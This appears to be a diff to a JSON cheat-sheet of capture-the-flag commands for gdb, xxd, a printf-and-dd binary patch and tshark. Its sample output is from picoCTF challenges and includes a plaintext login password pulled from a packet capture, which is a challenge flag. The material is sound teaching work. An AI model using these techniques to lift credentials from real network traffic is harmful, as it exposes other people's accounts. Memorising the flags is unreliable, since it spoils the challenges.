+      "Continue running until a source line past the current line, in the current stack frame, is reached. \nThis command is used to avoid single stepping through a loop more than once. It is like the next command, except that when until encounters a jump, it automatically continues execution until the program counter is greater than the address of the jump.",
+      "https://sourceware.org/gdb/onlinedocs/gdb/Continuing-and-Stepping.html",
+      "[-------------------------------------code-------------------------------------]\n   0x80487ac \u003cmain+228\u003e:        mov    eax,0x0\n   0x80487b1 \u003cmain+233\u003e:        mov    edi,edx\n=\u003e 0x80487b3 \u003cmain+235\u003e:        repnz scas al,BYTE PTR es:[edi]\n   0x80487b5 \u003cmain+237\u003e:        mov    eax,ecx\n   0x80487b7 \u003cmain+239\u003e:        not    eax\n   0x80487b9 \u003cmain+241\u003e:        lea    edx,[eax-0x1]\n   0x80487bc \u003cmain+244\u003e:        lea    eax,[ebp-0x154]\n   0x80487c2 \u003cmain+250\u003e:        add    eax,edx\n\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x080487b3 in main ()\ngdb-peda$ until"
+    ],
+    [
+      "Forensics",
+      "Binaries",
+      "0",
+      "No",
+      "xxd -s \u003coffset\u003e -l \u003clength\u003e \u003cbinary\u003e",
+      "Display hex view of binary between \u003coffset\u003e and \u003coffset+length\u003e.",
+      "https://www.systutorials.com/docs/linux/man/1-xxd/",
+      "root@kali:/media/sf_CTFs/pico/Ext_Super_Magic/v2# xxd -s $((1024+56)) -l 16 ext-super-magic.img\n00000438: 0000 0100 0100 0000 74dc ad5b 0000 0000  ........t..[...."
+    ],
+    [
+      "Forensics",
+      "Binaries",
+      "0",
+      "No",
+      "printf \u003cbytes\u003e |  dd conv=notrunc of=\u003cbinary\u003e bs=1 seek=\u003coffset\u003e",
+      "Patch a binary at offset \u003coffset\u003e with \u003cbytes\u003e.",
+      "http://pubs.opengroup.org/onlinepubs/9699919799/utilities/dd.html",
+      "root@kali:/media/sf_CTFs/pico/Ext_Super_Magic/v2# xxd -s $((1024+56)) -l 16 ext-super-magic.img\n00000438: 0000 0100 0100 0000 74dc ad5b 0000 0000  ........t..[....\nroot@kali:/media/sf_CTFs/pico/Ext_Super_Magic/v2# cp ext-super-magic.img ext-super-magic.old\nroot@kali:/media/sf_CTFs/pico/Ext_Super_Magic/v2# printf '\\x53\\xef' | dd conv=notrunc of=ext-super-magic.img bs=1 seek=$((1024+56))\n2+0 records in\n2+0 records out\n2 bytes copied, 0.00398822 s, 0.5 kB/s\nroot@kali:/media/sf_CTFs/pico/Ext_Super_Magic/v2# xxd -s $((1024+56)) -l 16 ext-super-magic.img\n00000438: 53ef 0100 0100 0000 74dc ad5b 0000 0000  S.......t..[...."
+    ],
+    [
+      "Network",
+      "tshark",
+      "10",
+      "No",
+      "tshark -nr \u003ccapture\u003e -Y '\u003cfilter\u003e'",
+      "Display all frames from a network capture which comply with filter.\n\nAdd '-x' for a full hex dump of the packets.\n\nAlternatively, use '-T json' to display readable JSON format.",
+      "",
+      "root@kali:/media/sf_CTFs/pico/admin_panel# tshark -nr data.pcap -Y 'frame contains \"password\"'\nRunning as user \"root\" and group \"root\". This could be dangerous.\ntshark: Lua: Error during loading:\n [string \"/usr/share/wireshark/init.lua\"]:32: dofile has been disabled due to running Wireshark as superuser. See https://wiki.wireshark.org/CaptureSetup/CapturePrivileges for help in running Wireshark as an unprivileged user.\n    8   0.004782 192.168.3.128 → 192.168.3.129 HTTP 2354 HTTP/1.0 200 OK  (text/html) 80 37556\n   17  12.370383 192.168.3.129 → 192.168.3.128 HTTP 522 POST /login HTTP/1.1  (application/x-www-form-urlencoded) 37894 80\n   21  12.373739 192.168.3.128 → 192.168.3.129 HTTP 569 HTTP/1.0 302 FOUND  (text/html) 80 37894\n   27  12.434002 192.168.3.129 → 192.168.3.128 HTTP 480 GET /admin HTTP/1.1  37896 80\n   43  14.662211 192.168.3.129 → 192.168.3.128 HTTP 486 GET /logout HTTP/1.1  37946 80\n   47  14.665356 192.168.3.128 → 192.168.3.129 HTTP 653 HTTP/1.0 302 FOUND  (text/html) 80 37946\n   60  14.675592 192.168.3.128 → 192.168.3.129 HTTP 906 HTTP/1.0 200 OK  (text/html) 80 37948\n   68  37.234879 192.168.3.129 → 192.168.3.128 HTTP 542 POST /login HTTP/1.1  (application/x-www-form-urlencoded)[Packet size limited during capture] 38526 80\n\nroot@kali:/media/sf_CTFs/pico/admin_panel# tshark -nr data.pcap -Y 'frame.number==68' -x\nRunning as user \"root\" and group \"root\". This could be dangerous.\ntshark: Lua: Error during loading:\n [string \"/usr/share/wireshark/init.lua\"]:32: dofile has been disabled due to running Wireshark as superuser. See https://wiki.wireshark.org/CaptureSetup/CapturePrivileges for help in running Wireshark as an unprivileged user.\n0000  00 0c 29 1c df f2 00 0c 29 79 dc c4 08 00 45 00   ..).....)y....E.\n0010  02 10 f6 7c 40 00 40 06 ba 19 c0 a8 03 81 c0 a8   ...|@.@.........\n0020  03 80 96 7e 00 50 12 95 30 5d 2e 5b be 02 80 18   ...~.P..0].[....\n0030  00 e5 8a 54 00 00 01 01 08 0a 18 8c 0c 8d f0 d7   ...T............\n0040  91 77 50 4f 53 54 20 2f 6c 6f 67 69 6e 20 48 54   .wPOST /login HT\n0050  54 50 2f 31 2e 31 0d 0a 48 6f 73 74 3a 20 31 39   TP/1.1..Host: 19\n0060  32 2e 31 36 38 2e 33 2e 31 32 38 0d 0a 55 73 65   2.168.3.128..Use\n0070  72 2d 41 67 65 6e 74 3a 20 4d 6f 7a 69 6c 6c 61   r-Agent: Mozilla\n0080  2f 35 2e 30 20 28 58 31 31 3b 20 55 62 75 6e 74   /5.0 (X11; Ubunt\n0090  75 3b 20 4c 69 6e 75 78 20 78 38 36 5f 36 34 3b   u; Linux x86_64;\n00a0  20 72 76 3a 35 39 2e 30 29 20 47 65 63 6b 6f 2f    rv:59.0) Gecko/\n00b0  32 30 31 30 30 31 30 31 20 46 69 72 65 66 6f 78   20100101 Firefox\n00c0  2f 35 39 2e 30 0d 0a 41 63 63 65 70 74 3a 20 74   /59.0..Accept: t\n00d0  65 78 74 2f 68 74 6d 6c 2c 61 70 70 6c 69 63 61   ext/html,applica\n00e0  74 69 6f 6e 2f 78 68 74 6d 6c 2b 78 6d 6c 2c 61   tion/xhtml+xml,a\n00f0  70 70 6c 69 63 61 74 69 6f 6e 2f 78 6d 6c 3b 71   pplication/xml;q\n0100  3d 30 2e 39 2c 2a 2f 2a 3b 71 3d 30 2e 38 0d 0a   =0.9,*/*;q=0.8..\n0110  41 63 63 65 70 74 2d 4c 61 6e 67 75 61 67 65 3a   Accept-Language:\n0120  20 65 6e 2d 55 53 2c 65 6e 3b 71 3d 30 2e 35 0d    en-US,en;q=0.5.\n0130  0a 41 63 63 65 70 74 2d 45 6e 63 6f 64 69 6e 67   .Accept-Encoding\n0140  3a 20 67 7a 69 70 2c 20 64 65 66 6c 61 74 65 0d   : gzip, deflate.\n0150  0a 52 65 66 65 72 65 72 3a 20 68 74 74 70 3a 2f   .Referer: http:/\n0160  2f 31 39 32 2e 31 36 38 2e 33 2e 31 32 38 2f 0d   /192.168.3.128/.\n0170  0a 43 6f 6e 74 65 6e 74 2d 54 79 70 65 3a 20 61   .Content-Type: a\n0180  70 70 6c 69 63 61 74 69 6f 6e 2f 78 2d 77 77 77   pplication/x-www\n0190  2d 66 6f 72 6d 2d 75 72 6c 65 6e 63 6f 64 65 64   -form-urlencoded\n01a0  0d 0a 43 6f 6e 74 65 6e 74 2d 4c 65 6e 67 74 68   ..Content-Length\n01b0  3a 20 35 33 0d 0a 43 6f 6e 6e 65 63 74 69 6f 6e   : 53..Connection\n01c0  3a 20 6b 65 65 70 2d 61 6c 69 76 65 0d 0a 55 70   : keep-alive..Up\n01d0  67 72 61 64 65 2d 49 6e 73 65 63 75 72 65 2d 52   grade-Insecure-R\n01e0  65 71 75 65 73 74 73 3a 20 31 0d 0a 0d 0a 75 73   equests: 1....us\n01f0  65 72 3d 61 64 6d 69 6e 26 70 61 73 73 77 6f 72   er=admin&passwor\n0200  64 3d 70 69 63 6f 43 54 46 7b 6e 30 74 73 33 63   d=picoCTF{n0ts3c\n0210  75 72 33 5f 39 66 65 65 64 66 62 63 7d            ur3_9feedfbc}"
     ]
   ]
 }
